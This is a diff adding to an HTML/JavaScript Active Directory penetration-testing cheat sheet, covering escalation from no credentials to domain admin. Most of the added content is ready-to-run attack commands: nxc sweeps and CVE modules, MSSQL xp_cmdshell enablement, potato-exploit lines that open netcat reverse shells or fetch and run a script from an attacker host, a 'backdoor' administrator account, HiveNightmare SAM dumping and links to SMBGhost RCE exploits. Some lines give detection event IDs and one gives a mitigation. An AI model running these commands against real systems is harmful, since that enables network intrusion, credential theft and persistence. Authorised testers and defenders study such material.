+        <div class="detect">&#128065; Detection: BloodyAD generates standard LDAP queries — EventID 1644 (LDAP query stats) and 4662 (object access). Shadow Credentials: EventID 5136 (msDS-KeyCredentialLink modified). BadSuccessor: EventID 5137 (new msDS-DelegatedManagedServiceAccount object created). DCSync grant: EventID 5136 on domain root nTSecurityDescriptor. Group membership changes: EventID 4728. Anomaly: high-volume LDAP writes from a workstation user account.</div>
+      </div>
+    </div>
+
     <!-- 10. Misconfigurations Checklist -->
     <div class="ref-card" id="rc-misconfig">
       <div class="ref-hdr" onclick="toggleRef('rc-misconfig')">
@@ -2885,6 +3494,28 @@ nxc ldap &lt;DC-IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' -M get-desc-users</code
                   <span class="gp-note">LAPS = local admin passwords in AD (readable if you have read rights). Descriptions frequently contain plaintext credentials left by admins.</span>
                 </div>
               </div>
+              <div class="gp-step">
+                <span class="gp-num">17</span>
+                <div class="gp-content">
+                  <span class="gp-title">&#9733; First-Creds Quick Wins — run all high-value checks in parallel</span>
+                  <code class="gp-cmd">nxc smb &lt;subnet&gt;/24 -u &lt;user&gt; -p '&lt;pass&gt;' --continue-on-success  # local admin sweep
+nxc ldap &lt;DC-IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' -M laps --gmsa -M get-desc-users
+nxc smb &lt;subnet&gt;/24 -u &lt;user&gt; -p '&lt;pass&gt;' -M spooler     # coercion candidates
+impacket-findDelegation '&lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;' -dc-ip &lt;DC-IP&gt;  # delegation map</code>
+                  <span class="gp-note">Run in parallel while BloodHound collects. (Pwn3d!) = local admin target. Spooler running on DC = coerce → relay to ADCS/LDAP. Delegation output feeds Phase 5.</span>
+                </div>
+                <span class="gp-link" onclick="jumpToRef('rc-quickwins')">Quick Wins &rarr;</span>
+              </div>
+              <div class="gp-step">
+                <span class="gp-num">18</span>
+                <div class="gp-content">
+                  <span class="gp-title">AD CVE &amp; software vulnerability scan</span>
+                  <code class="gp-cmd">nxc smb &lt;subnet&gt;/24 -u &lt;user&gt; -p '&lt;pass&gt;' -M zerologon -M nopac -M petitpotam -M printnightmare
+nxc smb &lt;DC-IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' -M ms17-010 -M smbghost</code>
+                  <span class="gp-note">Run CVE modules before diving into manual paths — a single VULNERABLE result means instant DA. Also check Exchange/ADCS/WSUS versions via HTTP banner and LDAP config partition.</span>
+                </div>
+                <span class="gp-link" onclick="jumpToRef('rc-vuln-scan')">CVE scan ref &rarr;</span>
+              </div>
             </div>
           </div>
 
@@ -2892,7 +3523,7 @@ nxc ldap &lt;DC-IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' -M get-desc-users</code
             <div class="gp-phase-label gp-p5">Phase 5 — Privilege Escalation Path Analysis</div>
             <div class="gp-steps">
               <div class="gp-step">
-                <span class="gp-num">17</span>
+                <span class="gp-num">19</span>
                 <div class="gp-content">
                   <span class="gp-title">Analyze BloodHound output — identify escalation paths</span>
                   <span class="gp-note">Key queries: "Shortest Paths to Domain Admins from Owned", "Find all Domain Admin Sessions", "Kerberoastable Users with DA Path", "ADCS ESC attack paths". Mark your user as Owned.</span>
@@ -2900,7 +3531,7 @@ nxc ldap &lt;DC-IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' -M get-desc-users</code
                 <span class="gp-link" onclick="jumpToRef('rc-bh')">BH edges &rarr;</span>
               </div>
               <div class="gp-step">
-                <span class="gp-num">18</span>
+                <span class="gp-num">20</span>
                 <div class="gp-content">
                   <span class="gp-title">ACL / BloodHound edge abuse</span>
                   <span class="gp-note">Priority: GenericAll &gt; WriteDACL &gt; GenericWrite &gt; WriteOwner &gt; AllExtendedRights &gt; ForceChangePassword. Each gives a different escalation path — check Reference for exact commands.</span>
@@ -2908,7 +3539,7 @@ nxc ldap &lt;DC-IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' -M get-desc-users</code
                 <span class="gp-link" onclick="jumpFilter([],['cat-privesc'])">Techniques &rarr;</span>
               </div>
               <div class="gp-step">
-                <span class="gp-num">19</span>
+                <span class="gp-num">21</span>
                 <div class="gp-content">
                   <span class="gp-title">Delegation attacks (Unconstrained / Constrained / RBCD)</span>
                   <span class="gp-note">Unconstrained: coerce DC auth &rarr; steal TGT &rarr; DCSync. RBCD: write msDS-AllowedToActOnBehalfOfOtherIdentity on target machine &rarr; impersonate DA.</span>
@@ -2916,7 +3547,7 @@ nxc ldap &lt;DC-IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' -M get-desc-users</code
                 <span class="gp-link" onclick="jumpToRef('rc-delegation')">Delegation ref &rarr;</span>
               </div>
               <div class="gp-step">
-                <span class="gp-num">20</span>
+                <span class="gp-num">22</span>
                 <div class="gp-content">
                   <span class="gp-title">Shadow Credentials, GPO abuse, KrbRelayUp</span>
                   <span class="gp-note">Shadow Creds: WriteKeyCredentialLink edge &rarr; cert auth &rarr; obtain NT hash. KrbRelayUp: any domain user &rarr; SYSTEM on same machine (requires no LDAP signing). GPO WriteGPO &rarr; code exec on whole OU.</span>
@@ -2930,7 +3561,7 @@ nxc ldap &lt;DC-IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' -M get-desc-users</code
             <div class="gp-phase-label gp-p6">Phase 6 — Local Admin to Domain Admin</div>
             <div class="gp-steps">
               <div class="gp-step">
-                <span class="gp-num">21</span>
+                <span class="gp-num">23</span>
                 <div class="gp-content">
                   <span class="gp-title">Dump LSASS — extract cached credentials &amp; Kerberos tickets</span>
                   <code class="gp-cmd">lsassy -u &lt;user&gt; -p '&lt;pass&gt;' -d &lt;domain&gt; &lt;target-IP&gt;   # remote dump + auto parse</code>
@@ -2939,7 +3570,7 @@ nxc ldap &lt;DC-IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' -M get-desc-users</code
                 <span class="gp-link" onclick="jumpFilter([],['cat-dump'])">Techniques &rarr;</span>
               </div>
               <div class="gp-step">
-                <span class="gp-num">22</span>
+                <span class="gp-num">24</span>
                 <div class="gp-content">
                   <span class="gp-title">Pass-the-Hash sweep + lateral movement</span>
                   <code class="gp-cmd">nxc smb &lt;subnet&gt;/24 -u administrator -H &lt;NT-hash&gt; --local-auth   # reuse check
@@ -2948,6 +3579,20 @@ wmiexec.py -hashes :&lt;hash&gt; &lt;domain&gt;/&lt;user&gt;@&lt;target&gt;</cod
                 </div>
                 <span class="gp-link" onclick="jumpFilter([],['cat-lateral'])">Techniques &rarr;</span>
               </div>
+              <div class="gp-step">
+                <span class="gp-num">25</span>
+                <div class="gp-content">
+                  <span class="gp-title">MSSQL lateral movement (if SQL servers present)</span>
+                  <code class="gp-cmd">nxc mssql &lt;subnet&gt;/24 -u &lt;user&gt; -p '&lt;pass&gt;' -d &lt;domain&gt;         # find instances
+mssqlclient.py &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;'@&lt;IP&gt; -windows-auth
+SQL&gt; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
+SQL&gt; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
+SQL&gt; EXEC xp_cmdshell 'whoami';
+SQL&gt; SELECT * FROM sys.servers;  -- enumerate linked servers</code>
+                  <span class="gp-note">Have: SQL sysadmin or Windows auth. (Pwn3d!) in nxc = sysadmin → xp_cmdshell → SYSTEM shell. Check linked servers — each hop can reach a new SQL instance with escalating privileges.</span>
+                </div>
+                <span class="gp-link" onclick="jumpToRef('rc-mssql')">MSSQL ref &rarr;</span>
+              </div>
             </div>
           </div>
 
@@ -2955,7 +3600,7 @@ wmiexec.py -hashes :&lt;hash&gt; &lt;domain&gt;/&lt;user&gt;@&lt;target&gt;</cod
             <div class="gp-phase-label gp-p7">Phase 7 — Domain Compromise &amp; Post-Exploitation</div>
             <div class="gp-steps">
               <div class="gp-step">
-                <span class="gp-num">23</span>
+                <span class="gp-num">26</span>
                 <div class="gp-content">
                   <span class="gp-title">DCSync — dump all domain password hashes</span>
                   <code class="gp-cmd">secretsdump.py &lt;domain&gt;/&lt;DA-user&gt;:'&lt;pass&gt;'@&lt;DC-IP&gt; -just-dc -outputfile dcsync.txt</code>
@@ -2964,7 +3609,7 @@ wmiexec.py -hashes :&lt;hash&gt; &lt;domain&gt;/&lt;user&gt;@&lt;target&gt;</cod
                 <span class="gp-link" onclick="jumpToRef('rc-kerberos')">Kerberos ref &rarr;</span>
               </div>
               <div class="gp-step">
-                <span class="gp-num">24</span>
+                <span class="gp-num">27</span>
                 <div class="gp-content">
                   <span class="gp-title">Persistence &amp; domain-wide secrets</span>
                   <span class="gp-note">Golden Ticket (krbtgt hash, 10yr TTL). DPAPI backup key (decrypts all user secrets, never rotates). AdminSDHolder (persistent ACE on privileged groups). Document all findings with screenshots before changes.</span>
@@ -2990,144 +3635,200 @@ wmiexec.py -hashes :&lt;hash&gt; &lt;domain&gt;/&lt;user&gt;@&lt;target&gt;</cod
 
         <div class="gt-branches">
 
+          <!-- ── No Credentials ── -->
           <div class="gt-branch">
             <div class="gt-branch-hdr gt-nc">&#128683; No Credentials</div>
             <div class="gt-branch-body">
               <div class="gt-item" onclick="jumpFilter(['have-nocreds'],['cat-enum'])">
                 <strong>Host &amp; port discovery</strong>
-                <span class="gt-item-sub">nmap → identify DC / CA / Exchange IPs</span>
+                <span class="gt-item-sub">Have: network access → Get: DC/CA/Exchange IPs, open service ports confirmed</span>
               </div>
               <div class="gt-item" onclick="jumpFilter(['have-nocreds'],['cat-enum'])">
                 <strong>SMB null session + RID cycling</strong>
-                <span class="gt-item-sub">Username list from unauthenticated access</span>
+                <span class="gt-item-sub">Have: network access → Get: domain username list, no creds needed</span>
               </div>
               <div class="gt-item" onclick="jumpFilter(['have-nocreds'],['cat-enum'])">
                 <strong>Kerbrute username enumeration</strong>
-                <span class="gt-item-sub">Valid users via Kerberos — zero lockout risk</span>
+                <span class="gt-item-sub">Have: network access + wordlist → Get: valid usernames via Kerberos — zero lockout risk</span>
               </div>
               <div class="gt-item" onclick="jumpFilter([],['cat-relay'])">
                 <strong>LLMNR / NBT-NS poisoning</strong>
-                <span class="gt-item-sub">Responder → NTLMv2 hashes from broadcast</span>
+                <span class="gt-item-sub">Have: network access, LLMNR/NBT-NS enabled → Get: NTLMv2 hashes from broadcast traffic</span>
               </div>
               <div class="gt-item" onclick="jumpFilter([],['cat-relay'])">
                 <strong>NTLM relay (signing disabled)</strong>
-                <span class="gt-item-sub">ntlmrelayx → SMB exec / LDAP / ADCS</span>
+                <span class="gt-item-sub">Have: SMB signing disabled on any target → Get: SAM dump / shell via relayed auth</span>
+              </div>
+              <div class="gt-item" onclick="jumpToRef('rc-coercion')">
+                <strong>Authentication Coercion</strong>
+                <span class="gt-item-sub">Have: network access + listener on 445 → Get: forced NTLM auth → relay to LDAP / ADCS / SMB</span>
               </div>
               <div class="gt-item" onclick="jumpFilter(['have-nocreds'],['cat-dump'])">
                 <strong>AS-REP roasting</strong>
-                <span class="gt-item-sub">No creds needed + username list → hashcat -m 18200</span>
+                <span class="gt-item-sub">Have: username list → Get: offline-crackable TGT hashes — no creds, no lockout</span>
               </div>
               <div class="gt-item" onclick="jumpFilter(['have-nocreds'],['cat-spray'])">
                 <strong>Password spray</strong>
-                <span class="gt-item-sub">1 attempt / lockout window. Check PSOs first.</span>
+                <span class="gt-item-sub">Have: username list + lockout policy confirmed → Get: valid domain credentials</span>
               </div>
             </div>
             <div class="gt-outcome">Got a hash or creds? <strong>&rarr; Valid User</strong></div>
           </div>
 
+          <!-- ── Valid Domain User ── -->
           <div class="gt-branch">
             <div class="gt-branch-hdr gt-vc">&#128100; Valid Domain User</div>
             <div class="gt-branch-body">
+              <div class="gt-item" onclick="jumpToRef('rc-quickwins')">
+                <strong>&#9733; First-Creds Quick Wins</strong>
+                <span class="gt-item-sub">Have: valid domain creds → Get: local admin targets, Kerberoast hashes, LAPS, CVE hits — all in 2 min</span>
+              </div>
               <div class="gt-item" onclick="jumpToRef('rc-bh')">
                 <strong>&#9733; BloodHound CE — run first</strong>
-                <span class="gt-item-sub">bloodhound-python -c All → import ZIP → find DA paths</span>
+                <span class="gt-item-sub">Have: valid domain creds → Get: all DA attack paths, ACL edges, owned principal graph</span>
               </div>
               <div class="gt-item" onclick="jumpToRef('rc-adcs')">
                 <strong>&#9733; ADCS enumeration</strong>
-                <span class="gt-item-sub">certipy find -vulnerable -enabled -stdout → ESC hits = DA</span>
+                <span class="gt-item-sub">Have: valid domain creds → Get: ESC1–16 vuln templates; any hit = direct DA path</span>
               </div>
               <div class="gt-item" onclick="jumpFilter(['have-username','have-password'],['cat-dump'])">
                 <strong>Kerberoasting</strong>
-                <span class="gt-item-sub">GetUserSPNs.py → service account hashes (-m 13100)</span>
+                <span class="gt-item-sub">Have: valid domain creds → Get: service account TGS hashes for offline cracking</span>
               </div>
               <div class="gt-item" onclick="jumpToRef('rc-delegation')">
                 <strong>Delegation check</strong>
-                <span class="gt-item-sub">Unconstrained / constrained / RBCD paths</span>
+                <span class="gt-item-sub">Have: valid domain creds → Get: unconstrained/constrained/RBCD hosts — paths to DA</span>
               </div>
               <div class="gt-item" onclick="jumpFilter([],['cat-privesc'])">
                 <strong>ACL / BloodHound edge abuse</strong>
-                <span class="gt-item-sub">GenericAll, WriteDACL, WriteOwner, GenericWrite</span>
+                <span class="gt-item-sub">Have: BloodHound edge (GenericAll/WriteDACL/GenericWrite) → Get: escalation to DA via ACL chain</span>
+              </div>
+              <div class="gt-item" onclick="jumpToRef('rc-bloodya')">
+                <strong>BloodyAD — LDAP privesc toolkit</strong>
+                <span class="gt-item-sub">Have: valid creds (pass/hash/cert/Kerberos) → Get: writable objects, shadow creds, RBCD, DCSync</span>
               </div>
               <div class="gt-item" onclick="jumpToRef('rc-shadow')">
                 <strong>Shadow Credentials</strong>
-                <span class="gt-item-sub">WriteKeyCredentialLink edge → cert auth → NT hash</span>
+                <span class="gt-item-sub">Have: WriteKeyCredentialLink edge on target → Get: certificate auth → NT hash of that account</span>
+              </div>
+              <div class="gt-item" onclick="jumpToRef('rc-coercion')">
+                <strong>Authentication Coercion</strong>
+                <span class="gt-item-sub">Have: valid creds + Responder/ntlmrelayx ready → Get: DC auth forced → relay to LDAP / ADCS</span>
+              </div>
+              <div class="gt-item" onclick="jumpToRef('rc-exchange')">
+                <strong>Exchange WriteDACL path</strong>
+                <span class="gt-item-sub">Have: member of Exchange Windows Permissions group → Get: DCSync rights → all domain hashes</span>
+              </div>
+              <div class="gt-item" onclick="jumpToRef('rc-sccm')">
+                <strong>SCCM attacks</strong>
+                <span class="gt-item-sub">Have: valid domain user → Get: NAA plaintext creds or code exec on all SCCM-managed hosts</span>
               </div>
               <div class="gt-item" onclick="jumpToRef('rc-mitm6')">
                 <strong>mitm6 + LDAP relay</strong>
-                <span class="gt-item-sub">IPv6 MITM → LDAP relay → RBCD / shadow creds</span>
+                <span class="gt-item-sub">Have: IPv6 active in network → Get: DNS hijack → NTLM relay to LDAP → RBCD/shadow creds</span>
               </div>
               <div class="gt-item" onclick="jumpToRef('rc-gpo')">
                 <strong>GPO abuse</strong>
-                <span class="gt-item-sub">WriteGPO / GpLink edge → code exec on entire OU</span>
+                <span class="gt-item-sub">Have: WriteGPO or GpLink ACL edge → Get: code exec on every host in the linked OU</span>
+              </div>
+              <div class="gt-item" onclick="jumpToRef('rc-adidns')">
+                <strong>ADIDNS record injection</strong>
+                <span class="gt-item-sub">Have: valid domain user (low-priv) → Get: DNS wildcard → intercept auth from any querying host</span>
+              </div>
+              <div class="gt-item" onclick="jumpToRef('rc-vuln-scan')">
+                <strong>AD CVE &amp; software scan</strong>
+                <span class="gt-item-sub">Have: valid domain creds → Get: unpatched CVE candidates — ZeroLogon, noPac, PrintNightmare, ADCS</span>
+              </div>
+              <div class="gt-item" onclick="jumpToRef('rc-cves')">
+                <strong>CVE exploitation</strong>
+                <span class="gt-item-sub">Have: foothold + vulnerable patch level → Get: DA via ZeroLogon / noPac / PrintNightmare / BadSuccessor</span>
               </div>
             </div>
             <div class="gt-outcome">Got local admin? <strong>&rarr; Local Admin</strong><br>Got ESC/ACL hit? <strong>&rarr; DA path</strong></div>
           </div>
 
+          <!-- ── Local Admin ── -->
           <div class="gt-branch">
             <div class="gt-branch-hdr gt-la">&#128274; Local Admin</div>
             <div class="gt-branch-body">
               <div class="gt-item" onclick="jumpFilter([],['cat-dump'])">
-                <strong>Dump LSASS (extract hashes &amp; tickets)</strong>
-                <span class="gt-item-sub">lsassy / mimikatz / nanodump</span>
+                <strong>Dump LSASS — extract hashes &amp; tickets</strong>
+                <span class="gt-item-sub">Have: local admin on host → Get: NT hashes, Kerberos TGTs, cleartext creds for lateral movement</span>
+              </div>
+              <div class="gt-item" onclick="jumpToRef('rc-privs')">
+                <strong>Windows Privileges check</strong>
+                <span class="gt-item-sub">Have: foothold on Windows host → Get: SeImpersonate = SYSTEM; SeDebug = LSASS dump; Backup Ops = domain hashes</span>
               </div>
               <div class="gt-item" onclick="jumpFilter([],['cat-lateral'])">
                 <strong>Pass-the-Hash sweep</strong>
-                <span class="gt-item-sub">nxc smb subnet --local-auth → find hash reuse</span>
+                <span class="gt-item-sub">Have: local admin NT hash → Get: all other machines with same password when LAPS absent</span>
               </div>
               <div class="gt-item" onclick="jumpFilter([],['cat-lateral'])">
                 <strong>Lateral movement</strong>
-                <span class="gt-item-sub">psexec / wmiexec / winrm → higher-value hosts</span>
+                <span class="gt-item-sub">Have: valid local admin or hash → Get: shell on higher-value host (server / DC staging)</span>
               </div>
               <div class="gt-item" onclick="jumpToRef('rc-delegation')">
                 <strong>Unconstrained delegation + coercion</strong>
-                <span class="gt-item-sub">Coerce DC auth → steal TGT → DCSync</span>
+                <span class="gt-item-sub">Have: local admin on unconstrained delegation host → Get: coerce DC auth → steal TGT → DCSync</span>
               </div>
               <div class="gt-item" onclick="jumpToRef('rc-dpapi')">
                 <strong>DPAPI credential extraction</strong>
-                <span class="gt-item-sub">Browser saved passwords, Wi-Fi, credential manager</span>
+                <span class="gt-item-sub">Have: local admin → Get: browser saved passwords, Wi-Fi keys, credential manager secrets</span>
+              </div>
+              <div class="gt-item" onclick="jumpToRef('rc-mssql')">
+                <strong>MSSQL lateral movement</strong>
+                <span class="gt-item-sub">Have: SQL sysadmin or Windows auth on SQL server → Get: xp_cmdshell → SYSTEM; linked servers → lateral</span>
               </div>
               <div class="gt-item" onclick="jumpToRef('rc-krbrelay')">
                 <strong>KrbRelayUp (domain user → SYSTEM)</strong>
-                <span class="gt-item-sub">Works when no LDAP signing enforced on DC</span>
+                <span class="gt-item-sub">Have: domain user shell + no LDAP signing on DC → Get: SYSTEM on local machine</span>
               </div>
               <div class="gt-item" onclick="jumpToRef('rc-lpe')">
                 <strong>Local privilege escalation</strong>
-                <span class="gt-item-sub">If not yet SYSTEM — token impersonation, services, UAC</span>
+                <span class="gt-item-sub">Have: foothold (any low-priv user) → Get: local admin / SYSTEM via token abuse, services, UAC bypass</span>
               </div>
             </div>
             <div class="gt-outcome">Got DA creds or hash? <strong>&rarr; Domain Admin</strong></div>
           </div>
 
+          <!-- ── Domain Admin ── -->
           <div class="gt-branch">
             <div class="gt-branch-hdr gt-da">&#128081; Domain Admin</div>
             <div class="gt-branch-body">
               <div class="gt-item" onclick="jumpFilter([],['cat-dump'])">
                 <strong>DCSync — dump all domain hashes</strong>
-                <span class="gt-item-sub">secretsdump -just-dc → krbtgt + every account</span>
+                <span class="gt-item-sub">Have: DA or explicit DCSync rights → Get: all NT hashes — krbtgt + every account</span>
               </div>
               <div class="gt-item" onclick="jumpToRef('rc-kerberos')">
                 <strong>Golden Ticket</strong>
-                <span class="gt-item-sub">krbtgt hash → forged TGT with 10yr validity</span>
+                <span class="gt-item-sub">Have: krbtgt NT hash → Get: forged TGT with 10yr validity, accepted on all domain hosts</span>
               </div>
               <div class="gt-item" onclick="jumpToRef('rc-dpapi')">
                 <strong>DPAPI domain backup key</strong>
-                <span class="gt-item-sub">Single key decrypts ALL user masterkeys — never rotates</span>
+                <span class="gt-item-sub">Have: DA → Get: single key decrypts ALL user DPAPI masterkeys — never rotates</span>
               </div>
               <div class="gt-item" onclick="jumpToRef('rc-persist')">
                 <strong>Persistence</strong>
-                <span class="gt-item-sub">AdminSDHolder, DCShadow, Skeleton Key, Golden gMSA</span>
+                <span class="gt-item-sub">Have: DA → Get: AdminSDHolder ACE, Skeleton Key, DCShadow, Golden gMSA — survive password resets</span>
               </div>
               <div class="gt-item" onclick="jumpToRef('rc-trusts')">
                 <strong>Domain / forest trust pivoting</strong>
-                <span class="gt-item-sub">SID history injection, inter-forest TGTs</span>
+                <span class="gt-item-sub">Have: DA in child domain → Get: parent domain compromise via SID history injection</span>
               </div>
               <div class="gt-item" onclick="jumpToRef('rc-entra')">
                 <strong>Hybrid / Entra ID pivoting</strong>
-                <span class="gt-item-sub">MSOL_ DCSync, AZUREADSSOACC$ Silver Ticket</span>
+                <span class="gt-item-sub">Have: DA on-prem → Get: cloud Global Admin via Entra Connect MSOL_ DCSync or SSO Silver Ticket</span>
+              </div>
+              <div class="gt-item" onclick="jumpToRef('rc-misconfig')">
+                <strong>Misconfigurations checklist</strong>
+                <span class="gt-item-sub">Have: DA + full access → Get: documented findings — SMB signing, LLMNR, weak passwords, ACL misconfigs</span>
+              </div>
+              <div class="gt-item" onclick="jumpToRef('rc-vuln-scan')">
+                <strong>Vulnerability assessment report</strong>
+                <span class="gt-item-sub">Have: DA → Get: CVE findings + outdated software inventory for client deliverable</span>
               </div>
             </div>
-            <div class="gt-outcome"><strong>Document everything</strong> — hashes, screenshots, access proof</div>
+            <div class="gt-outcome"><strong>Document everything</strong> — hashes, screenshots, access proof, timeline</div>
           </div>
 
         </div>
@@ -3823,27 +4524,267 @@ evil-winrm -u Administrator -H <NTLM-hash> -i <IP>
   },
   {
     title: 'Potato Attacks — SeImpersonatePrivilege to SYSTEM',
-    req: 'SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege (common on service accounts)',
-    gets: 'SYSTEM shell',
-    tags: ['have-localadmin','cat-privesc'],
-    cmd: `# Verify privilege
-whoami /priv
-# SeImpersonatePrivilege = Enabled → Potato attack
+    req: 'SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege (default on IIS AppPool, MSSQL service, NetworkService, LocalService accounts)',
+    gets: 'SYSTEM shell via token impersonation',
+    tags: ['have-foothold','cat-privesc'],
+    cmd: `# Step 0 — verify the privilege is present and enabled
+whoami /priv | findstr /i "SeImpersonate SeAssignPrimary"
+# If "Enabled" → proceed. If missing, try FullPowers.exe first (see below).
 
-# Windows Server 2019 / 2022
-PrintSpoofer.exe -i -c cmd
-PrintSpoofer.exe -i -c powershell
-
-# Older systems (2016 / Win 10)
-JuicyPotato.exe -l 1337 -p cmd.exe -t *
-
-# Universal (works on all modern Windows)
+# ── Universal (best default — works Server 2012–2022, Win 8–11) ───────────────
 GodPotato.exe -cmd "cmd /c whoami"
-GodPotato.exe -cmd "cmd /c net user backdoor P@ss123 /add && net localgroup administrators backdoor /add"
+GodPotato.exe -cmd "cmd /c net user backdoor P@ss123! /add && net localgroup administrators backdoor /add"
+GodPotato-NET4.exe -cmd "nc.exe -e cmd.exe <attacker-IP> <port>"  # choose .NET variant to match target
 
-# SweetPotato
-SweetPotato.exe -p cmd.exe`,
-    note: 'SeImpersonatePrivilege is set by default on IIS application pools, SQL Server service accounts, and other service accounts. Very common finding.'
+# ── Server 2016–2022 / Win 10/11 — SigmaPotato (no binary deps) ──────────────
+SigmaPotato.exe "cmd /c whoami"
+SigmaPotato.exe "powershell -ep bypass IEX(IWR http://<attacker>/shell.ps1)"
+
+# ── Server 2016/2019, Win 10 — PrintSpoofer (needs Print Spooler running) ─────
+PrintSpoofer.exe -i -c cmd.exe
+PrintSpoofer.exe -c "nc.exe <attacker-IP> <port> -e cmd.exe"
+
+# ── Server 2019+, Win 10 1809+ — JuicyPotatoNG ───────────────────────────────
+JuicyPotatoNG.exe -t * -p cmd.exe -a "/c whoami"
+
+# ── Server 2019, Win 10 1809+ — RoguePotato (needs socat on attacker) ─────────
+# Attacker:
+socat tcp-listen:135,reuseaddr,fork tcp:<target-IP>:9999
+# Target:
+RoguePotato.exe -r <attacker-IP> -e "cmd.exe" -l 9999
+
+# ── Older (Server 2008–2016, Win 7–Win10 <1803) — JuicyPotato original ────────
+JuicyPotato.exe -l 1337 -p cmd.exe -t *
+JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}   # BITS CLSID
+# Use LovelyPotato for automatic CLSID enumeration on older targets
+
+# ── No SeImpersonate? — FullPowers restores stripped privileges ───────────────
+FullPowers.exe                                   # spawns cmd.exe with full token
+FullPowers.exe -c "GodPotato.exe -cmd '...'"    # chain directly into potato`,
+    note: 'SeImpersonatePrivilege is assigned by default to IIS application pools, MSSQL service accounts, NetworkService, and LocalService. If present but the process token is stripped (common in hardened WCF/IIS setups), FullPowers.exe restores it via a scheduled task trick. GodPotato is the safest default — it works across the widest OS range and requires no external infrastructure.',
+    warn: 'JuicyPotato (original) does NOT work on Server 2019 or Win 10 1809+ — the DCOM impersonation path was patched. Use GodPotato, SigmaPotato, JuicyPotatoNG, or RoguePotato on modern systems.'
+  },
+  {
+    title: 'HiveNightmare / SeriousSAM — CVE-2021-36934 (Any Local User → NTLM Hash Dump)',
+    req: 'Any local user account on target; unpatched Windows 10/11 with at least one VSS shadow copy present (shadow copies are created automatically on most systems during updates)',
+    gets: 'SAM, SYSTEM, and SECURITY registry hives from shadow copy → offline extraction of all local account NTLM hashes including local Administrator',
+    tags: ['have-foothold','cat-dump','cat-exploit'],
+    cmd: `# Check if vulnerable — BUILTIN\\Users should NOT have read access
+icacls C:\\Windows\\System32\\config\\SAM
+# Vulnerable output: BUILTIN\\Users:(I)(RX)
+
+# List available shadow copies
+vssadmin list shadows
+# Note the VolumeShadowCopy path, e.g. HarddiskVolumeShadowCopy1
+
+# Copy hives from shadow copy (works as any local user)
+copy "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM"      .\\sam
+copy "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM"   .\\system
+copy "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY" .\\security
+
+# If no shadow copy exists — trigger one (needs admin; check for existing first)
+wmic shadowcopy call create Volume='C:\\'
+
+# Transfer files to attacker machine and extract hashes
+secretsdump.py -sam sam -system system -security security LOCAL
+# Output: Administrator:500:aad3...:NTLM_HASH:::
+
+# Use local admin hash for PTH or access
+nxc smb <target-IP> -u Administrator -H <NTLM-hash> --local-auth`,
+    note: 'The root cause is overly permissive ACLs on the SAM/SYSTEM hive set during a Windows 10 21H1 upgrade — BUILTIN\\Users was accidentally granted read access. Confirmed shadow copy is required; if none exist the attack fails. Patch: KB5005565+ (Sept 2021) removes the excess ACL. Check version with winver — affected builds are 21H1 (19041) and earlier. Also check SECURITY hive for cached domain credentials (DCC2 hashes).'
+  },
+  {
+    title: 'SMBGhost — CVE-2020-0796 (Pre-Auth RCE / LPE to SYSTEM)',
+    req: 'Network access to target on port 445; target must be Windows 10 1903 (build 18362) or 1909 (build 18363) — specifically NOT patched with KB4551762',
+    gets: 'Unauthenticated remote code execution as SYSTEM (remote variant) or local privilege escalation to SYSTEM (LPE variant)',
+    tags: ['have-foothold','cat-exploit','cat-privesc'],
+    cmd: `# Step 1 — Identify vulnerable targets
+# SMBGhost only affects Win10 1903/1909 — verify OS build first
+nmap -p 445 --script smb-os-discovery <target-IP>
+# Or from inside: winver  →  must show Version 1903 (build 18362) or 1909 (18363)
+
+# Step 2 — Verify SMBv3.1.1 compression is enabled (required for exploit)
+# PowerShell on target:
+Get-SmbServerConfiguration | Select EnableSMB2Protocol
+
+# Confirm not patched (missing KB4551762):
+wmic qfe list | findstr 4551762
+# If no output → likely unpatched
+
+# Step 3a — Local Privilege Escalation (you already have a low-priv shell)
+# Download: https://github.com/danigargu/CVE-2020-0796
+.\CVE-2020-0796-local.exe  # → spawns SYSTEM shell
+
+# Step 3b — Remote Pre-Auth RCE (unauthenticated network access)
+# Download: https://github.com/chompie1337/SMBGhost_RCE_PoC
+python3 exploit.py -ip <target-IP>              # → reverse shell as SYSTEM
+# NOTE: Remote PoC is unstable — may BSOD the target; test in lab first
+
+# Mitigate / Verify patch:
+# Apply KB4551762 or disable SMBv3 compression:
+Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters" -Name DisableCompression -Type DWORD -Value 1`,
+    warn: 'The remote RCE PoC is highly unstable and will likely BSOD (Blue Screen) the target before achieving code execution on production systems. The local LPE variant is reliable. This CVE only affects Win10 1903/1909 — any other OS is not affected.',
+    note: 'SMBGhost is a buffer overflow in the SMBv3.1.1 compression header (SrvNet.sys). It was silently fixed before a public advisory — details leaked from a patch notes accident. The local LPE path is the most useful in a pentest context when you have a foothold on an unpatched 1903/1909 system.'
+  },
+  {
+    title: 'RemotePotato0 — Local Admin + DA Session → Enterprise Admin (NTLM Relay via DCOM)',
+    req: 'Local Administrator shell in Session 0 on target machine AND a Domain Admin must be actively logged into an interactive session (Session 1) on the same machine; ntlmrelayx.py on attacker',
+    gets: 'Unprivileged domain user escalated to Enterprise Admin + DCSync rights — no CVE, no patch available (Microsoft declined to fix)',
+    tags: ['have-localadmin','proto-ldap','cat-privesc','cat-relay'],
+    cmd: `# Step 1 — Verify a DA is logged into an interactive session on target
+query sessions
+# Look for a console or RDP session owned by a Domain Admin account
+
